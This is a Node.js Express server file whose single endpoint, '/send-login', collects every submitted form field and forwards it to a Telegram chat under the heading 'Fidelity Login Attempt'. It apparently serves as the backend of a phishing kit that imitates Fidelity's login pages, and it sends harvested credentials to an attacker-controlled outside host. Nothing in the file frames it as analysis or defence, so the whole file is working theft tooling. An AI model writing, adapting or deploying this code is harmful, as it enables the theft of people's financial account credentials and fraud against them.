import express from "express";
import fetch from "node-fetch"; // or use global fetch in Node 18+

const app = express();
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("BOT_TOKEN and CHAT_ID must be set as environment variables");
  process.exit(1);
}

// Single endpoint to handle both forms
app.post("/send-login", async (req, res) => {
  const data = req.body;

  // Compose message dynamically based on received fields
  let message = "🔐 Fidelity Login Attempt\n";

  for (const [key, value] of Object.entries(data)) {
    message += `• ${key}: ${value}\n`;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();

    if (!result.ok) {
      console.error("Telegram API error:", result);
      return res.status(500).json({ error: "Failed to send message" });
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Error sending message:", error);
    res.status(500).json({ error: "Error sending message" });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
